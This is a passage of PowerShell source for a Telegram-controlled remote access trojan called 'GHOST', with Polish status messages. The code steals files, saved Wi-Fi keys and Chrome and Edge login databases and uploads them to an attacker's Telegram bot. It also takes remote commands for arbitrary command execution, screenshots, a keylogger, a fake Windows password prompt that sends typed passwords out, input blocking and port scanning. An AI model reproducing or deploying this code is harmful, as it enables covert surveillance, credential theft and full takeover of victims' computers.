$tot=0
$cand=Get-ChildItem $roots -Recurse -File -EA 0 | Where-Object { $_.Length -lt 8MB -and ($_.Extension -match $ext -or $_.Name -match 'wa[zż]ne') } | Sort-Object LastWriteTime -Descending
foreach($f in $cand){
  if(($tot + $f.Length) -gt 35MB){ continue }
  $h=[BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($f.DirectoryName))).Replace('-','').Substring(0,8)
  $sd=Join-Path $dst $h; if(-not (Test-Path $sd)){ New-Item -ItemType Directory $sd -Force | Out-Null }
  Copy-Item $f.FullName -Destination $sd -Force -EA 0
  $tot=$tot + $f.Length
}

try{ [Console]::OutputEncoding=[Text.Encoding]::GetEncoding(852) }catch{}
$wf="$env:TEMP\wifi.txt"
$prof=(netsh wlan show profiles 2>$null)
$prof | Out-File $wf -Encoding utf8
foreach($l in $prof){
  $n=($l.ToString() -split ':')[-1].Trim()
  if($n -and $l.ToString() -match ':'){ "=== $n ===" | Out-File $wf -Append -Encoding utf8; netsh wlan show profile name="$n" key=clear 2>$null | Out-File $wf -Append -Encoding utf8 }
}

foreach($b in @(@("$env:LOCALAPPDATA\Google\Chrome\User Data","Chrome"),@("$env:LOCALAPPDATA\Microsoft\Edge\User Data","Edge"))){
  if(Test-Path $b[0]){
    Grab "$($b[0])\Local State" "$env:TEMP\$($b[1])Key.json"
    foreach($p in (Get-ChildItem $b[0] -Directory -EA 0 | Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile *' })){
      Grab (Join-Path $p.FullName 'Login Data') "$env:TEMP\$($b[1])_$($p.Name -replace ' ','').db"
    }
  }
}

if(Get-ChildItem $dst -File -Recurse -EA 0){ Compress-Archive -Path "$dst\*" -DestinationPath "$env:TEMP\out.zip" -Force -EA 0 }

$zn=(Get-ChildItem $dst -File -Recurse -EA 0 | Measure-Object).Count
$zb=[int]((Get-Item "$env:TEMP\out.zip" -EA 0).Length/1KB)
$adm='user'
try{ $adm=(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) }catch{}
$lm='full'; try{ $lm=[string]$ExecutionContext.SessionState.LanguageMode }catch{}
T "GHOST $ver ONLINE: $(whoami) @ $env:COMPUTERNAME | admin=$adm | clm=$lm | pliki=$zn zip=${zb}KB"

TD "$env:TEMP\out.zip"; TD "$env:TEMP\wifi.txt"
Get-ChildItem "$env:TEMP" -Filter '*Key.json' -EA 0 | ForEach-Object { TD $_.FullName }
Get-ChildItem "$env:TEMP" -Filter 'Chrome_*.db' -EA 0 | ForEach-Object { TD $_.FullName }
Get-ChildItem "$env:TEMP" -Filter 'Edge_*.db' -EA 0 | ForEach-Object { TD $_.FullName }
Remove-Item $dst -Recurse -Force -EA 0
Remove-Item "$env:TEMP\out.zip","$env:TEMP\wifi.txt","$env:TEMP\o.txt" -Force -EA 0
}

# ================= petla =================
$off=0
try{ $u=Invoke-RestMethod "$api/getUpdates?offset=-1" -TimeoutSec 15; if($u.result){ $off=$u.result[-1].update_id+1 } }catch{}

$go=$true; $del=$false; $fails=0
while($go){
try{
$u=Invoke-RestMethod "$api/getUpdates?offset=$off&timeout=30" -TimeoutSec 45
$fails=0
foreach($r in $u.result){
$off=$r.update_id+1
if($r.message.chat.id -ne $cid){ continue }
Beat

if($r.message.document){
try{
$fi=Invoke-RestMethod "$api/getFile?file_id=$($r.message.document.file_id)" -TimeoutSec 20
iwr -useb "https://api.telegram.org/file/bot$tok/$($fi.result.file_path)" -OutFile (Join-Path $cwd $r.message.document.file_name) -UseB -TimeoutSec 30
T "zapisano: $cwd\$($r.message.document.file_name)"
}catch{ T "nie udalo sie zapisac pliku" }
}

if($r.message.photo){
try{
$ph=$r.message.photo[-1]
$fi=Invoke-RestMethod "$api/getFile?file_id=$($ph.file_id)" -TimeoutSec 20
iwr -useb "https://api.telegram.org/file/bot$tok/$($fi.result.file_path)" -OutFile (Join-Path $cwd ("foto_" + $ph.file_unique_id + ".jpg")) -UseB -TimeoutSec 30
T "zapisano zdjecie w $cwd"
}catch{ T "nie udalo sie zapisac zdjecia" }
}

$c=$r.message.text
if($c){
$t=($c.Trim() -replace '^/','')
if($t -eq ''){ Menu }
elseif($t -match '^!(\w+)[ ]?([\s\S]*)$'){
$k=$matches[1].ToLower(); $a=$matches[2].Trim()
$ErrorActionPreference='Stop'
try{
switch($k){
'menu'{ Menu }
'help'{ Menu }
'ping'{ T "pong $ver @ $env:COMPUTERNAME" }
'ss'{ $p="$env:TEMP\sc.jpg"; if(SS $p){ TP $p "$env:COMPUTERNAME $(Get-Date -Format HH:mm:ss)" } else { T "zrzut nie wyszedl (zablokowana sesja?)" }; Remove-Item $p -Force -EA 0 }
'ls'{ $p=$cwd; if($a){ $p=$a }; if(Test-Path $p -PathType Container){ Big ((Get-ChildItem $p -Force -EA 0 | ForEach-Object { $_.LastWriteTime.ToString('yy-MM-dd HH:mm') + '  ' + $(if($_.PSIsContainer){'<DIR>'}else{$_.Length}) + '  ' + $_.Name }) -join "`r`n") } else { T "brak katalogu: $p" } }
'cd'{ if($a -and (Test-Path $a -PathType Container)){ $cwd=(Resolve-Path $a).Path; T "cwd: $cwd" } else { T "brak katalogu: $a" } }
'get'{ if($a -and (Test-Path $a)){ if((Get-Item $a).PSIsContainer){ $z="$env:TEMP\d.zip"; Remove-Item $z -Force -EA 0; Compress-Archive -Path "$a\*" -DestinationPath $z -Force; if((Get-Item $z).Length -gt 45MB){ T "folder za duzy (>45MB)" } else { TD $z }; Remove-Item $z -Force -EA 0 } else { if((Get-Item $a).Length -gt 45MB){ T "plik za duzy (>45MB)" } else { TD $a } } } else { T "brak: $a" } }
'put'{ T "Wyslij plik/zdjecie jako dokument na ten czat - wyladuje w $cwd" }
'upload'{ if($a){ $n=Split-Path $a -Leaf; iwr -useb $a -OutFile (Join-Path $cwd $n) -UseB -TimeoutSec 120; T "pobrano: $cwd\$n" } }
'run'{ if($a){ Big ((cmd /c $a 2>&1 | Out-String)) } }
'ps'{ Big ((Get-Process -EA 0 | Sort-Object WS -Descending | Select-Object -First 25 Id,ProcessName,@{n='MB';e={[int]($_.WS/1MB)}} | Format-Table -Auto | Out-String)) }
'kill'{ if($a){ if($a -match '^\d+$'){ Stop-Process -Id $a -Force -EA 0 } else { Stop-Process -Name $a -Force -EA 0 }; T "kill: $a" } }
'ip'{ Big ((ipconfig /all | Out-String)) }
'wifi'{ $w="$env:TEMP\wf.txt"; $pr=(netsh wlan show profiles 2>$null); $pr | Out-File $w -Encoding utf8; foreach($l in $pr){ $n=($l.ToString() -split ':')[-1].Trim(); if($n -and $l.ToString() -match ':'){ netsh wlan show profile name="$n" key=clear 2>$null | Out-File $w -Append -Encoding utf8 } }; TD $w; Remove-Item $w -Force -EA 0 }
'pass'{ DumpPass }
'sys'{ $os=Get-CimInstance Win32_OperatingSystem; $d=(Get-CimInstance Win32_LogicalDisk -Filter "DriveType=3" | ForEach-Object { "$($_.DeviceID) $([int]($_.FreeSpace/1GB))GB wolne / $([int]($_.Size/1GB))GB" }) -join "`r`n"; Big ((@("user: $(whoami)","host: $env:COMPUTERNAME","os: $($os.Caption) $($os.Version)","boot: $($os.LastBootUpTime)",$d)) -join "`r`n") }
'users'{ Big ((quser 2>&1 | Out-String)) }
'clip'{ Big ((Get-Clipboard -Raw 2>&1 | Out-String)) }
'msg'{ if($a){ Spawn "param(`$x)`Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(`$x,'Ghost')" $a; T "wyswietlone" } }
'lock'{ rundll32.exe user32.dll,LockWorkStation; T "zablokowane" }
'reboot'{ T "restart za 5s"; shutdown /r /t 5 }
'shutdown'{ T "wylaczenie za 5s"; shutdown /s /t 5 }
'off'{ (Get-Date).ToString('s') | Out-File $stop -Encoding ascii; T "stop miekki, watchdog stoi"; $go=$false }
'on'{ Remove-Item $stop -Force -EA 0; T "wznowione"; Start-Process powershell -ArgumentList "-w hidden -nop -ep bypass -f `"$me`" -poll" -WindowStyle Hidden; $go=$false }
'uninstall'{
  foreach($p in @('\Microsoft\Windows\WindowsUpdate\GhostSync','\GhostSystem01W','\GhostSystem01')){ schtasks /delete /tn $p /f 2>$null | Out-Null }
  Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\GhostSystem01.lnk" -Force -EA 0
  Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'GhostSystem01' -EA 0
  '1' | Out-File $kloff -Encoding ascii
  Remove-Item $stop,$hb,$pidf,$klpid,$klcs,$klf,"$dir\notes.txt","$dir\wiggle.on" -Force -EA 0
  T "usuniete, koncze"; $del=$true; $go=$false
}
# ---------- keylog ----------
'keylog','kl'{
  switch($a){
    'on'{
      if((Test-Path $klpid) -and (Get-Process -Id (Get-Content $klpid -EA 0) -EA 0)){ T "keylogger juz dziala"; break }
      Remove-Item $kloff -Force -EA 0
      $klsrc | Out-File $klcs -Encoding utf8
      Spawn 'param($d)
Add-Type -TypeDefinition (Get-Content "$d\kl.cs" -Raw)
[KeyLog]::Start("$d\kl.log")
$PID | Out-File "$d\kl.pid" -Encoding ascii
while(-not (Test-Path "$d\kl.off")){ Start-Sleep 2 }
[KeyLog]::Stop()' $dir
      Start-Sleep 2; T "keylogger ON"
    }
    'off'{ '1' | Out-File $kloff -Encoding ascii; Remove-Item $klpid -Force -EA 0; T "keylogger OFF" }
    'clear'{ Clear-Content $klf -EA 0; T "log wyczyszczony" }
    'dump'{ if(Test-Path $klf){ if((Get-Item $klf).Length -gt 3MB){ Get-Content $klf -Tail 20000 | Out-File "$env:TEMP\klt.txt" -Encoding utf8; TD "$env:TEMP\klt.txt"; Remove-Item "$env:TEMP\klt.txt" -Force } else { TD $klf } } else { T "brak logu" } }
    'live'{ if(Test-Path $klf){ Big ((Get-Content $klf -Tail 60) -join "`n") } else { T "brak logu" } }
    default{ T "!keylog on|off|dump|live|clear" }
  }
}
'klcs'{
  $o=@()
  $o+="=== keylog ==="; if(Test-Path $klf){ $o+=((Get-Content $klf -Tail 15) -join "`n") } else { $o+="brak" }
  $o+="`n=== okna ==="; $o+=((Get-Process -EA 0 | Where-Object { $_.MainWindowTitle } | Select-Object -First 12 ProcessName,MainWindowTitle | Format-Table -Auto | Out-String))
  $o+="`n=== recent ==="; $o+=((Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -EA 0 | Sort-Object LastWriteTime -Desc | Select-Object -First 12 Name | Format-Table -Auto | Out-String))
  Big ($o -join "`n")
}
# ---------- flip ----------
'flip'{ T "FLIP`n!duck <skrypt> !duckdemo !wiggle on|off !wol <mac> !scan <host> !ble`n!toast <t>|<tresc> !bsod !update !matrix !qr <tekst> !phish`n!vol <0-100|mute> !brt <0-100> !wall <url> !tts <tekst> !beep !block <sek> !lock2" }
'duckdemo'{ Duck "GUI r`nDELAY 600`nSTRING notepad`nENTER`nDELAY 900`nSTRING Ghost was here`nENTER`n"; T "duck poszedl" }
'duck'{ if($a){ Duck $a; T "duck poszedl" } }
'wiggle'{
  $wf="$dir\wiggle.on"
  if($a -eq 'off'){ Remove-Item $wf -Force -EA 0; T "jiggler off" }
  elseif($a -eq 'on'){
    if(Test-Path $wf){ T "juz chodzi" } else {
      '1' | Out-File $wf -Encoding ascii
      Spawn 'param($p)
Add-Type -Name J -Namespace W -MemberDefinition ''[DllImport("user32.dll")] public static extern void mouse_event(int f,int x,int y,int d,int e); [DllImport("kernel32.dll")] public static extern uint SetThreadExecutionState(uint f);''
while(Test-Path $p){ [W.J]::mouse_event(1,1,0,0,0); [W.J]::mouse_event(1,-1,0,0,0); [W.J]::SetThreadExecutionState(3) | Out-Null; Start-Sleep 25 }' $wf
      T "jiggler on (25s)"
    }
  }
}
'wol'{ if($a){ Wol $a; T "magic packet -> $a" } }
'scan'{
  if($a){
    $tgt=$a; if($tgt -notmatch '^\d'){ try{ $tgt=[Net.Dns]::GetHostAddresses($tgt)[0].IPAddressToString }catch{} }
    $p=21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,5985,6379,8080,8443
    $o=Scan $tgt $p
    if($o){ Big ("$tgt OPEN: " + ($o -join ', ')) } else { T "$tgt - brak otwartych z listy" }
  }
}
'ble'{
  $code='param($tok,$cid)
[Windows.Devices.Bluetooth.Advertisement.BluetoothLEAdvertisementWatcher, Windows.Devices.Bluetooth, ContentType=WindowsRuntime] | Out-Null
$seen=@{}
$w=New-Object Windows.Devices.Bluetooth.Advertisement.BluetoothLEAdvertisementWatcher
$w.ScanningMode=[Windows.Devices.Bluetooth.Advertisement.BluetoothLEScanningMode]::Active
$h={ param($s,$e)
  $ad=$e.ReceivedAdvertisement; $n=$ad.BluetoothAddress
  if(-not $seen.ContainsKey($n)){ $nm=$ad.LocalName; if(-not $nm){ $nm="(bez nazwy)" }; $seen[$n]="$([Convert]::ToString([long]$n,16)) | rssi=$($ad.RawSignalStrengthInDBm) | $nm" }
}
Register-ObjectEvent -InputObject $w -EventName Received -Action $h | Out-Null
$w.Start(); Start-Sleep 12; $w.Stop()
$txt=($seen.Values | Sort-Object) -join "`n"; if(-not $txt){ $txt="nic nie zlapano (adapter BT?)" }
curl.exe -s --max-time 20 -F "chat_id=$cid" --form-string "text=BLE:`n$txt" "https://api.telegram.org/bot$tok/sendMessage" | Out-Null'
  Spawn $code "$tok $cid"; T "skan BLE 12s..."
}
'toast'{ if($a){ $p=$a -split '\|',2; if(Toast $p[0] ($p[1])){ T "toast" } else { T "toast nie wyszedl" } } }
'bsod'{ Full @'
Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing
$f=New-Object Windows.Forms.Form
$f.FormBorderStyle='None'; $f.WindowState='Maximized'; $f.TopMost=$true; $f.BackColor=[Drawing.Color]::FromArgb(0,120,215)
$l=New-Object Windows.Forms.Label; $l.Dock='Fill'; $l.ForeColor='White'
$l.Font=New-Object Drawing.Font('Segoe UI',28); $l.TextAlign='MiddleCenter'
$l.Text=":(`n`nCos poszlo nie tak.`n`nZbieranie informacji o bledzie... 47%`n`n`nKliknij, aby zamknac."
$l.Add_Click({ $f.Close() }); $f.Controls.Add($l)
[void]$f.ShowDialog()
'@; T "bsod (klik = zamknij)" }
'update'{ Full @'
Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing
$f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.WindowState='Maximized'; $f.TopMost=$true; $f.BackColor='Black'
$l=New-Object Windows.Forms.Label; $l.Dock='Fill'; $l.ForeColor='White'; $l.TextAlign='MiddleCenter'
$l.Font=New-Object Drawing.Font('Segoe UI Light',32); $l.Text="Aktualizowanie systemu`n`nNie wylaczaj komputera`n`n0%"
$f.Controls.Add($l); $st=@{p=0}
$t=New-Object Windows.Forms.Timer; $t.Interval=1000
$t.Add_Tick({ $st.p++; if($st.p -ge 100){ $f.Close() } else { $l.Text="Aktualizowanie systemu`n`nNie wylaczaj komputera`n`n$($st.p)%" } })
$t.Start(); [void]$f.ShowDialog()
'@; T "fake update (100s)" }
'matrix'{ Full @'
Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing
$f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.WindowState='Maximized'; $f.TopMost=$true; $f.BackColor='Black'
$c=New-Object Windows.Forms.PictureBox; $c.Dock='Fill'; $f.Controls.Add($c)
$bmp=New-Object Drawing.Bitmap $f.Width,$f.Height; $c.Image=$bmp
$g=[Drawing.Graphics]::FromImage($bmp); $g.Clear([Drawing.Color]::Black)
$fn=New-Object Drawing.Font('Consolas',14); $br=New-Object Drawing.SolidBrush ([Drawing.Color]::Lime)
$rnd=New-Object Random; $cols=@(); for($x=0;$x -lt $f.Width;$x+=18){ $cols+=$rnd.Next(0,$f.Height) }
$t=New-Object Windows.Forms.Timer; $t.Interval=45
$t.Add_Tick({
  $g.FillRectangle((New-Object Drawing.SolidBrush ([Drawing.Color]::FromArgb(30,0,0,0))),0,0,$bmp.Width,$bmp.Height)
  for($i=0;$i -lt $cols.Count;$i++){ $g.DrawString([char]$rnd.Next(33,126),$fn,$br,($i*18),$cols[$i]); $cols[$i]+=18; if($cols[$i] -gt $bmp.Height){ $cols[$i]=0 } }
  $c.Refresh()
})
$f.Add_KeyDown({ $f.Close() }); $t.Start(); [void]$f.ShowDialog()
'@; T "matrix (klawisz = wyjscie)" }
'qr'{ if($a){
  $u="https://api.qrserver.com/v1/create-qr-code/?size=600x600&data=" + [Uri]::EscapeDataString($a)
  $p="$env:TEMP\q.png"; iwr -useb $u -OutFile $p -UseB -TimeoutSec 20
  Full "param(`$p)
Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing
`$f=New-Object Windows.Forms.Form; `$f.FormBorderStyle='None'; `$f.WindowState='Maximized'; `$f.TopMost=`$true; `$f.BackColor='White'
`$i=New-Object Windows.Forms.PictureBox; `$i.Dock='Fill'; `$i.SizeMode='Zoom'; `$i.Image=[Drawing.Image]::FromFile(`$p)
`$i.Add_Click({ `$f.Close() }); `$f.Controls.Add(`$i); [void]`$f.ShowDialog()" $p
  TP $p $a
} }
'phish'{ Full @'
param($tok,$cid)
Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.WindowState='Maximized'; $f.TopMost=$true; $f.BackColor=[Drawing.Color]::FromArgb(32,32,32)
$p=New-Object Windows.Forms.Panel; $p.Size=New-Object Drawing.Size 460,300; $p.BackColor=[Drawing.Color]::FromArgb(45,45,45)
$f.Add_Resize({ $p.Left=($f.Width-$p.Width)/2; $p.Top=($f.Height-$p.Height)/2 }); $p.Left=600; $p.Top=300
$u=New-Object Windows.Forms.Label; $u.Text="$env:USERNAME"; $u.ForeColor='White'; $u.Font=New-Object Drawing.Font('Segoe UI',20); $u.SetBounds(30,30,400,40); $p.Controls.Add($u)
$t=New-Object Windows.Forms.Label; $t.Text='Wpisz haslo, aby kontynuowac'; $t.ForeColor='#aaa'; $t.SetBounds(30,75,400,30); $p.Controls.Add($t)
$b=New-Object Windows.Forms.TextBox; $b.UseSystemPasswordChar=$true; $b.SetBounds(30,120,400,30); $b.Font=New-Object Drawing.Font('Segoe UI',14); $p.Controls.Add($b)
$o=New-Object Windows.Forms.Button; $o.Text='Zaloguj'; $o.SetBounds(330,170,100,32); $p.Controls.Add($o)
$s=New-Object Windows.Forms.Label; $s.ForeColor='#f66'; $s.SetBounds(30,210,400,25); $p.Controls.Add($s)
$f.Controls.Add($p)
$ok={
  $pw=$b.Text; $r='?'
  try{ $ctx=New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Machine'); if($ctx.ValidateCredentials($env:USERNAME,$pw)){ $r='OK' } else { $r='ZLE' } }
  catch{ try{ $ctx=New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain'); if($ctx.ValidateCredentials($env:USERNAME,$pw)){ $r='OK' } else { $r='ZLE' } }catch{ $r='blad' } }
  curl.exe -s --max-time 20 -F "chat_id=$cid" --form-string "text=PHISH $env:COMPUTERNAME / $env:USERNAME : $pw -> $r" "https://api.telegram.org/bot$tok/sendMessage" | Out-Null
  if($r -eq 'OK'){ $f.Close() } else { $s.Text='Nieprawidlowe haslo'; $b.Clear(); $b.Focus() }
}
$o.Add_Click($ok); $b.Add_KeyDown({ if($_.KeyCode -eq 'Enter'){ & $ok } })
$f.Add_Shown({ $f.Activate(); $b.Focus() }); [void]$f.ShowDialog()
'@ "$tok $cid"; T "phish wyswietlony" }
'vol'{
  if($a -eq 'mute'){ Kb 0xAD }
  else { $n=[int]$a; 1..50 | ForEach-Object { Kb 0xAE }; if($n -gt 0){ 1..[int]($n/2) | ForEach-Object { Kb 0xAF } } }
  T "vol: $a"
}
'brt'{ if($a){ (Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods).WmiSetBrightness(1,[int]$a); T "jasnosc: $a" } }
'wall'{ if($a){ $p="$env:TEMP\w.jpg"; iwr -useb $a -OutFile $p -UseB -TimeoutSec 30; [H]::SystemParametersInfo(0x14,0,$p,3) | Out-Null; T "tapeta zmieniona" } }
'tts'{ if($a){ Spawn "param(`$t)`Add-Type -AssemblyName System.Speech; `$s=New-Object System.Speech.Synthesis.SpeechSynthesizer; `$s.Speak(`$t)" $a; T "tts" } }
'beep'{ 1..3 | ForEach-Object { [console]::Beep(880,150); [console]::Beep(1320,150) }; T "beep" }
'block'{ $s=10; if($a){ $s=[int]$a }; Spawn "Add-Type -Name B -Namespace W -MemberDefinition '[DllImport(\"user32.dll\")] public static extern bool BlockInput(bool f);'; [W.B]::BlockInput(`$true); Start-Sleep $s; [W.B]::BlockInput(`$false)"; T "input zablokowany na ${s}s" }
'lock2'{ Combo 0x5B 0x4C; T "zablokowane" }
'keys'{ if($a){ Duck $a; "wyslane" } }
default{
  if($simple.ContainsKey($k)){ Big ((& $simple[$k]) | Out-String) }
  else { Big ((iex $t 2>&1 | Out-String)) }
}
}
}catch{ T ("blad !$k : " + $_.Exception.Message) }
$ErrorActionPreference='SilentlyContinue'
}
else { Big ((iex $t 2>&1 | Out-String)) }
}
}
}catch{
$fails++
if($fails -eq 6){ T "problem z lacznoscia/tokenem, proba $fails" }
if($fails -gt 40){ $fails=0 }
Start-Sleep ([Math]::Min(3*$fails,45))
}
Start-Sleep 2
}
if($del){ Remove-Item $me,$guard -Force -EA 0 }
